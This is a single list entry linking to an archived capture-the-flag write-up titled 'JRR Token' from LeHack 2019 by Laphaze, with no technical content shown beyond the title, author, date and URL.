* [Write up – JRR Token – LeHack 2019 - Laphaze - July 7, 2019](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
